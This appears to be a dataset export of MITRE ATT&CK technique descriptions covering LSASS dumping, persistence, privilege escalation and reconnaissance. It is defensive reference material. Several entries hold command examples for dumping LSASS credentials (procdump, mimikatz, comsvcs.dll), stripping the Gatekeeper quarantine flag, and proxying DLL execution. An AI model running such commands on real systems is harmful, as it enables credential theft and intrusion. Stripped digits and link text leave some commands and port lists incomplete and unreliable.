attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90,['enterprise-attack'],['T1003.001'],LSASS Memory,adversaries may attempt to access credential material stored in the process memory of the local security authority subsystem service  lsass   after a user logs on  the system generates and stores a variety of credential materials in lsass process memory  these credential materials can be harvested by an administrative user or system and used to conduct  lateral  using  use alternate authentication   as well as in memory techniques  the lsass process memory can be dumped from the target host and analyzed on a local system_  for example  on the target host use procdump     procdump  ma lsass_exe lsass_dump  locally  mimikatz can be run using     sekurlsa  minidump lsassdump_dmp   sekurlsa  logonpasswords  built in windows tools such as comsvcs_dll can also be used     rundll  _exe c  windows system   comsvcs_dll minidump pid  lsass_dmp full citation  volexity exchange marauder march       citation  symantec attacks against government sector    windows security support provider  ssp  dlls are loaded into lsass process at system start  once loaded into the lsa  ssp dlls have access to encrypted and plaintext passwords that are stored in windows  such as any logged on user's domain password or smart card pins  the ssp configuration is stored in two registry keys  hklm system currentcontrolset control lsa security packages and hklm system currentcontrolset control lsa osconfig security packages  an adversary may modify these registry keys to add new ssps  which will be loaded the next time the system boots  or when the addsecuritypackage windows api function is called_ citation  graeber        the following ssps can be used to access credentials     msv  interactive logons  batch logons  and service logons are done through the msv authentication package_   wdigest  the digest authentication protocol is designed for use with hypertext transfer protocol  http  and simple authentication security layer  sasl  exchanges_ citation  technet blogs credential protection    kerberos  preferred for mutual client server domain authentication in windows      and later_   credssp   provides sso and network level authentication for remote desktop services_ citation  technet blogs credential protection 
attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e,['enterprise-attack'],['T1053.001'],At (Linux),adversaries may abuse the  utility to perform task scheduling for initial  recurring  or future execution of malicious code  the  command within linux operating systems enables administrators to schedule tasks_ citation  kifarunix   task scheduling in linux   an adversary may use  in linux environments to execute programs at system startup or on a scheduled basis for persistence   can also be abused to conduct remote execution as part of lateral movement and or to run a process under the context of a specified account_  adversaries may also abuse  to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands  similarly   may also be used for  privilege  if the binary is allowed to run as superuser via sudo_ citation  gtfobins at 
attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5,['enterprise-attack'],['T1179'],Hooking,windows processes often leverage application programming interface  api  functions to perform tasks that require reusable system resources  windows api functions are typically stored in dynamic link libraries  dlls  as exported functions    hooking involves redirecting calls to these functions and can be implemented via       hooks procedures    which intercept and execute designated code in response to events such as messages  keystrokes  and mouse inputs   citation  microsoft hook overview   citation  elastic process injection july           import address table  iat  hooking    which use modifications to a process s iat  where pointers to imported api functions are stored   citation  elastic process injection july        citation  adlice software iat hooks oct        citation  mwrinfosecurity dynamic hooking           inline hooking    which overwrites the first bytes in an api function to redirect code flow   citation  elastic process injection july        citation  hightech bridge inline hooking sept        citation  mwrinfosecurity dynamic hooking        similar to  process  adversaries may use hooking to load and execute malicious code within the context of another process  masking the execution while also allowing access to the process's memory and possibly elevated privileges  installing hooking mechanisms may also provide persistence via continuous invocation when the functions are called through normal use_  malicious hooking mechanisms may also capture api calls that include parameters that reveal user authentication credentials for credential access   citation  microsoft trojanspy win   ursnif_gen i sept        hooking is commonly utilized by  to conceal files  processes  registry keys  and other objects in order to hide malware and associated behaviors   citation  symantec windows rootkits 
attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b,['enterprise-attack'],['T1595'],Active Scanning,adversaries may execute active reconnaissance scans to gather information that can be used during targeting  active scans are those where the adversary probes victim infrastructure via network traffic  as opposed to other forms of reconnaissance that do not involve direct interaction_  adversaries may perform different forms of active scanning depending on what information they seek to gather  these scans can also be performed in various ways  including using native features of network protocols such as icmp_ citation  botnet scan  citation  owasp fingerprinting  information from these scans may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote  or  exploit public facing
attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a,['enterprise-attack'],['T1547.011'],Plist Modification,adversaries can modify property list files  plist files  to execute their code as part of establishing persistence  plist files are used by macos applications to store properties and configuration settings for applications and services  applications use information plist files  info_plist  to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values  plist files are formatted in xml and based on apple's core foundation dtd and can be saved in text or binary format_ citation  fileinfo plist file description    adversaries can modify paths to executed binaries  add command line arguments  and insert key pair values to plist files in auto run locations which execute upon user logon or system startup  through modifying plist files in these locations  adversaries can also execute a malicious dynamic library  dylib  by adding a dictionary containing the dyld_insert_libraries key combined with a path to a malicious dylib under the environmentvariables key in a plist file  upon user logon  the plist is called for execution and the malicious dylib is executed within the process space  persistence can also be achieved by modifying the lsenvironment key in the application's info_plist file_ citation  wardle artofmalware volume  
attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b,['enterprise-attack'],['T1548'],Abuse Elevation Control Mechanism,adversaries may circumvent mechanisms designed to control elevate privileges to gain higher level permissions  most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine  authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk  an adversary can perform several methods to take advantage of built in control mechanisms in order to escalate privileges on a system 
attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf,['enterprise-attack'],['T1134.002'],Create Process with Token,adversaries may create a new process with a different token to escalate privileges and bypass access controls  processes can be created with the token and resulting security context of another user using features such as createprocesswithtokenw and runas_ citation  microsoft runas   creating processes with a different token may require the credentials of the target user  specific privileges to impersonate that user  or access to the token to be used  ex  gathered via other means such as  token  or  make and impersonate
attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9,['enterprise-attack'],['T1548.001'],Setuid and Setgid,an adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different  and possibly more privileged  user s context  on linux or macos  when the setuid or setgid bits are set for an application binary  the application will run with the privileges of the owning user or group respectively_ citation  setuid man page  normally an application is run in the current user s context  regardless of which user or group owns the application  however  there are instances where programs need to be executed in an elevated context to function properly  but the user running them may not have the specific required privileges_  instead of creating an entry in the sudoers file  which must be done by root  any user can specify the setuid or setgid flag to be set for their own applications  i_e   linux and mac file and directory permissions  the chmod command can set these bits with bitmasking  chmod       file  or via shorthand naming  chmod u s  file   this will enable the setuid bit  to enable the setgit bit  chmod      and chmod g s can be used_  adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future_ citation  osx keydnap malware  this abuse is often part of a  shell escape  or other actions to bypass an execution environment with restricted permissions_  alternatively  adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled  i_e   file and directory  the setuid and setguid bits are indicated with an  s  instead of an  x  when viewing a file's attributes via ls  l  the find command can also be used to search for such files  for example  find    perm          dev null can be used to find files with setuid set and find    perm          dev null may be used for setgid  binaries that have these bits set may then be abused by adversaries_ citation  gtfobins suid 
attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35,['enterprise-attack'],['T1547.004'],Winlogon Helper DLL,adversaries may abuse features of winlogon to execute dlls and or executables when a user logs in  winlogon_exe is a windows component responsible for actions at logon logoff as well as the secure attention sequence  sas  triggered by ctrl alt delete  registry entries in hklm software   wow    node    microsoft windows nt currentversion winlogon  and hkcu software microsoft windows nt currentversion winlogon  are used to manage additional helper programs and functionalities that support winlogon_ citation  cylance reg persistence sept         malicious modifications to these registry keys may cause winlogon to load and execute malicious dlls and or executables  specifically  the following subkeys have been known to be possibly vulnerable to abuse   citation  cylance reg persistence sept          winlogon notify   points to notification package dlls that handle winlogon events   winlogon userinit   points to userinit_exe  the user initialization program executed when a user logs on   winlogon shell   points to explorer_exe  the system shell executed when a user logs on  adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence 
attack-pattern--6856ddd6-2df3-4379-8b87-284603c189c3,['enterprise-attack'],['T1019'],System Firmware,the bios  basic input output system  and the unified extensible firmware interface  uefi  or extensible firmware interface  efi  are examples of system firmware that operate as the software interface between the operating system and hardware of a computer   citation  wikipedia bios   citation  wikipedia uefi   citation  about uefi   system firmware like bios and  u efi underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity  capabilities exist to overwrite the system firmware  which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect 
attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd,['enterprise-attack'],['T1021.003'],Distributed Component Object Model,adversaries may use  valid  to interact with remote machines by taking advantage of distributed component object model  dcom   the adversary may then perform actions as the logged on user_  the windows component object model  com  is a component of the native windows application programming interface  api  that enables interaction between software objects  or executable code that implements one or more interfaces  through com  a client object can call methods of server objects  which are typically dynamic link libraries  dll  or executables  exe   distributed com  dcom  is transparent middleware that extends the functionality of com beyond a local computer using remote procedure call  rpc  technology_ citation  fireeye hunting com june       citation  microsoft com   permissions to interact with local and remote server com objects are specified by access control lists  acl  in the registry_ citation  microsoft process wide com keys  by default  only administrators may remotely activate and launch com objects through dcom_ citation  microsoft com acl   through dcom  adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through office applications citation  enigma outlook dcom lateral movement nov       as well as other windows objects that contain insecure methods_ citation  enigma mmc   com jan       citation  enigma dcom lateral movement jan       dcom can also execute macros in existing documents citation  enigma excel dcom sept       and may also invoke  dynamic data   dde  execution directly through a com created instance of a microsoft office application citation  cyberreason dcom dde lateral movement nov        bypassing the need for a malicious document  dcom can be used as a method of remotely interacting with  windows management   citation  msdn wmi 
attack-pattern--68c96494-1a50-403e-8844-69a6af278c68,['enterprise-attack'],['T1042'],Change Default File Association,when a file is opened  the default program used to open the file  also called the file association or handler  is checked  file association selections are stored in the windows registry and can be edited by users  administrators  or programs that have registry access  citation  microsoft change default programs   citation  microsoft file handlers  or by administrators using the built in assoc utility   citation  microsoft assoc oct       applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened_  system file associations are listed under hkey_classes_root _ extension   for example hkey_classes_root _txt  the entries point to a handler for that extension located at hkey_classes_root  handler   the various commands are then listed as subkeys underneath the shell key at hkey_classes_root  handler  shell  action  command  for example    hkey_classes_root txtfile shell open command   hkey_classes_root txtfile shell print command   hkey_classes_root txtfile shell printto command  the values of the keys listed are commands that are executed when the handler opens the file extension  adversaries can modify these values to continually execute arbitrary commands   citation  trendmicro troj fakeav oct      
attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a,['enterprise-attack'],['T1117'],Regsvr32,regsvr  _exe is a command line program used to register and unregister object linking and embedding controls  including dynamic link libraries  dlls   on windows systems  regsvr  _exe can be used to execute arbitrary binaries   citation  microsoft regsvr     adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of  and modules loaded by  the regsvr  _exe process because of whitelists or false positives from windows using regsvr  _exe for normal operations  regsvr  _exe is also a microsoft signed binary_  regsvr  _exe can also be used to specifically bypass process whitelisting using functionality to load com scriptlets to execute dlls under user permissions  since regsvr  _exe is network and proxy aware  the scripts can be loaded by passing a uniform resource locator  url  to file on an external web server as an argument during invocation  this method makes no changes to the registry as the com object is not actually registered  only executed   citation  lolbas regsvr    this variation of the technique is often referred to as a  squiblydoo  attack and has been used in campaigns targeting governments   citation  carbon black squiblydoo apr        citation  fireeye regsvr   targeting mongolian gov   regsvr  _exe can also be leveraged to register a com object used to establish persistence via  component object model   citation  carbon black squiblydoo apr      
attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c,['enterprise-attack'],['T1110.003'],Password Spraying,adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials  password spraying uses one password  e_g  'password  '   or a small list of commonly used passwords  that may match the complexity policy of the domain  logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords   citation  blackhillsinfosec password spraying   typically  management services over commonly used ports are used when password spraying  commonly targeted services include the following     ssh     tcp    telnet     tcp    ftp     tcp    netbios   smb   samba      tcp       tcp    ldap      tcp    kerberos     tcp    rdp   terminal services       tcp    http http management services     tcp       tcp    mssql       tcp    oracle       tcp    mysql       tcp    vnc       tcp   in addition to management services  adversaries may  target single sign on  sso  and cloud based applications utilizing federated authentication protocols   as well as externally facing email applications  such as office    _ citation  us cert ta      a        in default environments  ldap and kerberos connection attempts are less likely to trigger events over smb  which creates windows  logon failure  event id      
attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3,['enterprise-attack'],['T1090.002'],External Proxy,adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure  many tools exist that enable traffic redirection through proxies or port redirection  including  zxproxy  and zxportmap   citation  trend micro apt attack tools  adversaries use these types of proxies to manage command and control communications  to provide resiliency in the face of connection loss  or to ride over existing trusted communications paths to avoid suspicion_  external connection proxies are used to mask the destination of c  traffic and are typically implemented with port redirectors  compromised systems outside of the victim environment may be used for these purposes  as well as purchased infrastructure such as cloud based resources or virtual private servers  proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated  victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the c  server 
attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e,['enterprise-attack'],['T1056.003'],Web Portal Capture,adversaries may install code on externally facing portals  such as a vpn login page  to capture and transmit credentials of users who attempt to log into the service  for example  a compromised login page may log provided user credentials before logging the user in to the service_  this variation on input capture may be conducted post compromise using legitimate administrative access as a backup measure to maintain network access through  external remote  and  valid  or as part of the initial compromise by exploitation of the externally facing web service_ citation  volexity virtual private keylogging 
attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262,['enterprise-attack'],['T1589.002'],Email Addresses,adversaries may gather email addresses that can be used during targeting  even if internal instances exist  organizations may have public facing email infrastructure and addresses for employees_  adversaries may easily gather email addresses  since they may be readily available and exposed via online or other accessible data sets  ex   social  or  search victim owned  hackersarise email  citation  cnet leaks  email addresses could also be enumerated via more active means  i_e   active  such as probing and analyzing responses from authentication services that may reveal valid usernames in a system_ citation  grimblog usernameenum  for example  adversaries may be able to enumerate email addresses in office     environments by querying a variety of publicly available api endpoints  such as autodiscover and getcredentialtype_ citation  github office     user enumeration  citation  azure active directory reconnaisance   gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  phishing for  establishing operational resources  ex   email  and or initial access  ex   or  brute  via  external remote
attack-pattern--6a3be63a-64c5-4678-a036-03ff8fc35300,['enterprise-attack'],['T1164'],Re-opened Applications,starting in mac os x   _   lion   users can specify certain applications to be re opened when a user reboots their machine  while this is usually done via a graphical user interface  gui  on an app by app basis  there are property list files  plist  that contain this information as well located at   library preferences com_apple_loginwindow_plist and   library preferences byhost com_apple_loginwindow_  _plist    an adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine  citation  methods of mac malware persistence  
attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df,['enterprise-attack'],['T1054'],Indicator Blocking,an adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed  this could include maliciously redirecting  citation  microsoft lamin sept       or even disabling host based sensors  such as event tracing for windows  etw   citation  microsoft about event tracing       by tampering settings that control the collection and flow of event telemetry   citation  medium event tracing tampering       these settings may be stored on the system in configuration files and or in the registry as well as being accessible via administrative utilities such as  or  windows management   etw interruption can be achieved multiple ways  however most directly by defining conditions using the powershell set etwtraceprovider cmdlet or by interfacing directly with the registry to make alterations_  in the case of network based reporting of indicators  an adversary may block traffic associated with reporting to prevent central analysis  this may be accomplished by many means  such as stopping a local process responsible for forwarding telemetry and or creating a host based firewall rule to block traffic to specific hosts responsible for aggregating events  such as security information and event management  siem  products 
attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a,['enterprise-attack'],['T1108'],Redundant Access,  this technique has been deprecated  please use  create   web  and  external remote  where appropriate_    adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated    if one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access  then the adversary will be able to retain access to the network  adversaries may also attempt to gain access to  valid  to use  external remote  such as external vpns as a way to maintain access despite interruptions to remote access tools deployed within a target network_ citation  mandiant apt   adversaries may also retain access through cloud based infrastructure and applications_  use of a  web  is one such way to maintain access to a network through an externally accessible web server 
attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38,['enterprise-attack'],['T1193'],Spearphishing Attachment,spearphishing attachment is a specific variant of spearphishing  spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email  all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  adversaries attach a file to the spearphishing email and usually rely upon  user  to gain execution_  there are many options for the attachment such as microsoft office documents  executables  pdfs  or archived files  upon opening the attachment  and potentially clicking past protections   the adversary's payload exploits a vulnerability or directly executes on the user's system  the text of the spearphishing email usually tries to give a plausible reason why the file should be opened  and may explain how to bypass system protections in order to do so  the email may also contain instructions on how to decrypt an attachment  such as a zip file password  in order to evade email boundary defenses  adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files  or files exploiting one application appear to be a file for a different one 
attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530,['enterprise-attack'],['T1003.005'],Cached Domain Credentials,adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable_ citation  microsoft   cached creds   on windows vista and newer  the hash format is dcc   domain cached credentials version    hash  also known as ms cache v  hash_ citation  passlib mscache  the number of default cached credentials varies and can be altered per system  this hash does not allow pass the hash style attacks  and instead requires  password  to recover the plaintext password_ citation  ired mscache   with system access  the tools utilities such as   and secretsdump_py can be used to extract the cached credentials_  note  cached credentials for windows vista are derived using pbkdf _ citation  passlib mscache 
attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4,['enterprise-attack'],['T1098.004'],SSH Authorized Keys,adversaries may modify the ssh authorized_keys file to maintain persistence on a victim host  linux distributions and macos commonly use key based authentication to secure the authentication process of ssh sessions for remote management  the authorized_keys file in ssh specifies the ssh keys that can be used for logging into the user account for which the file is configured  this file is usually found in the user's home directory under  lt user home gt  _ssh authorized_keys_ citation  ssh authorized keys  users may edit the system s ssh config file to modify the directives pubkeyauthentication and rsaauthentication to the value  yes  to ensure public key and rsa authentication are enabled  the ssh config file is usually located under  etc ssh sshd_config_  adversaries may modify ssh authorized_keys files directly with scripts or shell commands to add their own adversary supplied public keys  in cloud environments  adversaries may be able to modify the ssh authorized_keys file of a particular virtual machine via the command line interface or rest api  for example  by using the google cloud cli s  add metadata  command an adversary may add ssh keys to a user account_ citation  google cloud add metadata  citation  google cloud privilege escalation  similarly  in azure  an adversary may update the authorized_keys file of a virtual machine via a patch request to the api_ citation  azure update virtual machines  this ensures that an adversary possessing the corresponding private key may log in as an existing user via ssh_ citation  venafi ssh key abuse  citation  cybereason linux exim worm   where authorized_keys files are modified via cloud apis or command line interfaces  an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher privileged user 
attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5,['enterprise-attack'],['T1215'],Kernel Modules and Extensions,loadable kernel modules  or lkms  are pieces of code that can be loaded and unloaded into the kernel upon demand  they extend the functionality of the kernel without the need to reboot the system  for example  one type of module is the device driver  which allows the kernel to access hardware connected to the system   citation  linux kernel programming  when used maliciously  loadable kernel modules  lkms  can be a type of kernel mode  that run with the highest operating system privilege  ring      citation  linux kernel module programming guide  adversaries can use loadable kernel modules to covertly persist on a system and evade defenses  examples have been found in the wild and there are some open source projects   citation  volatility phalanx    citation  crowdstrike linux rootkit   citation  github reptile   citation  github diamorphine   common features of lkm based rootkits include  hiding itself  selective hiding of files  processes and network activity  as well as log tampering  providing authenticated backdoors and enabling root access to non privileged users   citation  idefense rootkit overview   kernel extensions  also called kext  are used for macos to load functionality onto a system similar to lkms for linux  they are loaded and unloaded through kextload and kextunload commands  several examples have been found where this can be used   citation  rsac      san francisco patrick wardle   citation  synack secure kernel extension broken  examples have been found in the wild   citation  securelist ventir 
attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446,['enterprise-attack'],['T1101'],Security Support Provider,windows security support provider  ssp  dlls are loaded into the local security authority  lsa  process at system start  once loaded into the lsa  ssp dlls have access to encrypted and plaintext passwords that are stored in windows  such as any logged on user's domain password or smart card pins  the ssp configuration is stored in two registry keys  hklm system currentcontrolset control lsa security packages and hklm system currentcontrolset control lsa osconfig security packages  an adversary may modify these registry keys to add new ssps  which will be loaded the next time the system boots  or when the addsecuritypackage windows api function is called_   citation  graeber      
attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413,['enterprise-attack'],['T1590.006'],Network Security Appliances,adversaries may gather information about the victim's network security appliances that can be used during targeting  information about network security appliances may include a variety of details  such as the existence and specifics of deployed firewalls  content filters  and proxies bastion hosts  adversaries may also target information about victim network based intrusion detection systems  nids  or other appliances related to defensive cybersecurity operations_  adversaries may gather this information in various ways  such as direct collection actions via  active  or  phishing for  nmap firewalls nids  information about network security appliances may also be exposed to adversaries via online or other accessible data sets  ex   search victim owned  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open technical  or  search open  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote
attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6,['enterprise-attack'],['T1546.012'],Image File Execution Options Injection,adversaries may establish persistence and or elevate privileges by executing malicious content triggered by image file execution options  ifeo  debuggers  ifeos enable a developer to attach a debugger to an application  when a process is created  a debugger present in an application s ifeo will be prepended to the application s name  effectively launching the new process under the debugger  e_g_  c  dbg ntsd_exe  g  notepad_exe    citation  microsoft dev blog ifeo mar        ifeos can be set directly via the registry or in global flags via the gflags tool   citation  microsoft gflags mar       ifeos are represented as debugger values in the registry under hklm software  wow    node  microsoft windows nt currentversion image file execution options  where  lt executable gt  is the binary on which the debugger is attached   citation  microsoft dev blog ifeo mar        ifeos can also enable an arbitrary monitor program to be launched when a specified program silently exits  i_e  is prematurely terminated by itself or a second  non kernel mode process    citation  microsoft silent process exit nov        citation  oddvar moe ifeo apr       similar to debuggers  silent exit monitoring can be enabled through gflags and or by directly modifying ifeo and silent process exit registry values in hkey_local_machine software microsoft windows nt currentversion silentprocessexit    citation  microsoft silent process exit nov        citation  oddvar moe ifeo apr        similar to  accessibility  on windows vista and later as well as windows server      and later  a registry key may be modified that configures  cmd_exe   or another program that provides backdoor access  as a  debugger  for an accessibility program  ex  utilman_exe   after the registry is modified  pressing the appropriate key combination at the login screen while at the keyboard or when connected with  remote desktop  will cause the  debugger  program to be executed with system privileges   citation  tilbury        similar to  process  these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer   citation  elastic process injection july       installing ifeo mechanisms may also provide persistence via continuous triggered invocation_  malware may also use ifeo to  impair  by registering invalid debuggers that redirect and effectively disable various system and security applications   citation  fsecure hupigon   citation  symantec ushedix june      
attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071,['enterprise-attack'],['T1218.008'],Odbcconf,adversaries may abuse odbcconf_exe to proxy execution of malicious payloads  odbcconf_exe is a windows utility that allows you to configure open database connectivity  odbc  drivers and data source names_ citation  microsoft odbcconf_exe  the odbcconf_exe binary may be digitally signed by microsoft_  adversaries may abuse odbcconf_exe to bypass application control solutions that do not account for its potential abuse  similar to  odbcconf_exe has a regsvr flag that can be misused to execute dlls  ex  odbcconf_exe  s  a  lbrace regsvr  c  users public file_dll  rbrace     citation  lolbas odbcconf  citation  trendmicro squiblydoo aug       citation  trendmicro cobalt group nov      
attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968,['enterprise-attack'],['T1593.002'],Search Engines,adversaries may use search engines to collect information about victims that can be used during targeting  search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content  i_e  filetypes _ citation  securitytrails google hacking  citation  exploitdb googlehacking   adversaries may craft various search engine queries depending on what information they seek to gather  threat actors may use search engines to harvest general information about victims  as well as use specialized queries to look for spillages leaks of sensitive information such as network details or credentials  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open technical  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   valid  or
attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352,['enterprise-attack'],['T1177'],LSASS Driver,the windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain  the local security authority  lsa  is the main component responsible for local security policy and user authentication  the lsa includes multiple dynamic link libraries  dlls  associated with various other security functions  all of which run in the context of the lsa subsystem service  lsass  lsass_exe process   citation  microsoft security subsystem   adversaries may target lsass_exe drivers to obtain execution and or persistence  by either replacing or adding illegitimate drivers  e_g_   dll  or  dll search order  an adversary can achieve arbitrary code execution triggered by continuous lsa operations 
attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f,['enterprise-attack'],['T1591.002'],Business Relationships,adversaries may gather information about the victim's business relationships that can be used during targeting  information about an organization s business relationships may include a variety of details  including second or third party organizations domains  ex  managed service providers  contractors  etc_  that have connected  and potentially elevated  network access  this information may also reveal supply chains and shipment paths for the victim s hardware and software resources_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about business relationships may also be exposed to adversaries via online or other accessible data sets  ex   social  or  search victim owned  threatpost broadvoice leak  gathering this information may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   supply chain   drive by  or  trusted
attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf,['enterprise-attack'],['T1125'],Video Capture,an adversary can leverage a computer's peripheral devices  e_g_  integrated cameras or webcams  or applications  e_g_  video call services  to capture video recordings for the purpose of gathering information  images may also be captured from devices or applications  potentially in specified intervals  in lieu of video files_  malware or scripts may be used to interact with the devices through an available api provided by the operating system or an application to capture video or images  video or image files may be written to disk and exfiltrated later  this technique differs from  screen  due to use of specific devices or applications for video recording rather than capturing the victim's screen_  in macos  there are a few different malware samples that record the user's webcam such as fruitfly and proton   citation  objective see      review 
attack-pattern--6fb6408c-0db3-41d9-a3a1-a32e5f16454e,['enterprise-attack'],['T1144'],Gatekeeper Bypass,in macos and os x  when applications or programs are downloaded from the internet  there is a special attribute set on the file called com_apple_quarantine  this attribute is read by apple's gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution    apps loaded onto the system from usb flash drive  optical disk  external hard drive  or even from a drive shared over the local network won t set this flag  additionally  other utilities or events like drive by downloads don t necessarily set it either  this completely bypasses the built in gatekeeper check   citation  methods of mac malware persistence  the presence of the quarantine flag can be checked by the xattr command xattr  path to myapp_app for com_apple_quarantine  similarly  given sudo access or elevated permission  this attribute can be removed with xattr as well  sudo xattr  r  d com_apple_quarantine  path to myapp_app   citation  clearing quarantine attribute   citation  oceanlotus for os x    in typical operation  a file will be downloaded from the internet and given a quarantine flag before being saved to disk  when the user tries to open the file or application  macos s gatekeeper will step in and check for the presence of this flag  if it exists  then macos will then prompt the user to confirmation that they want to run the program and will even provide the url where the application came from  however  this is all based on the file being downloaded from a quarantine savvy application   citation  bypassing gatekeeper 
attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88,['enterprise-attack'],['T1045'],Software Packing,software packing is a method of compressing or encrypting an executable  packing an executable changes the file signature in an attempt to avoid signature based detection  most decompression techniques decompress the executable code in memory_  utilities used to perform software packing are called packers  example packers are mpress and upx  a more comprehensive list of known packers is available   citation  wikipedia exe compression  but adversaries may create their own packing techniques that do not leave the same artifacts as well known packers to evade defenses_  adversaries may use virtual machine software protection as a form of software packing to protect their code  virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run  a virtual machine is then called to run this code_ citation  eset finfisher jan      
attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197,['enterprise-attack'],['T1055.013'],Process Doppelgnging,adversaries may inject malicious code into process via process doppelg nging in order to evade process based defenses as well as possibly elevate privileges  process doppelg nging is a method of executing arbitrary code in the address space of a separate live process    windows transactional ntfs  txf  was introduced in vista as a method to perform safe file operations   citation  microsoft txf  to ensure data integrity  txf enables only one transacted handle to write to a file at a given time  until the write handle transaction is terminated  all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened   citation  microsoft basic txf concepts  to avoid corruption  txf performs an automatic rollback if the system or application fails during a write transaction   citation  microsoft where to use txf   although deprecated  the txf application programming interface  api  is still enabled as of windows      citation  blackhat process doppelg nging dec        adversaries may abuse txf to a perform a file less variation of  process  similar to  process  process doppelg nging involves replacing the memory of a legitimate process  enabling the veiled execution of malicious code that may evade defenses and detection  process doppelg nging's use of txf also avoids the use of highly monitored api functions such as ntunmapviewofsection  virtualprotectex  and setthreadcontext   citation  blackhat process doppelg nging dec        process doppelg nging is implemented in   steps  citation  blackhat process doppelg nging dec           transact   create a txf transaction using a legitimate executable then overwrite the file with malicious code  these changes will be isolated and only visible within the context of the transaction_   load   create a shared section of memory and load the malicious executable_   rollback   undo changes to original executable  effectively removing malicious code from the file system_   animate   create a process from the tainted section of memory and initiate execution_  this behavior will likely not result in elevated privileges since the injected process was spawned from  and thus inherits the security context  of the injecting process  however  execution via process doppelg nging may evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0,['enterprise-attack'],['T1016'],System Network Configuration Discovery,adversaries may look for details about the network configuration and settings  such as ip and or mac addresses  of systems they access or through information discovery of remote systems  several operating system administration utilities exist that can be used to gather this information  examples include    and   adversaries may also leverage a  network device  on network devices to gather information about configurations and settings  such as ip addresses of configured interfaces and static dynamic routes  e_g  show ip route  show ip interface _ citation  mandiant apt   global intrusion    adversaries may use the information from  system network configuration  during automated discovery to shape follow on behaviors  including determining certain access within the target network and what actions to do next 
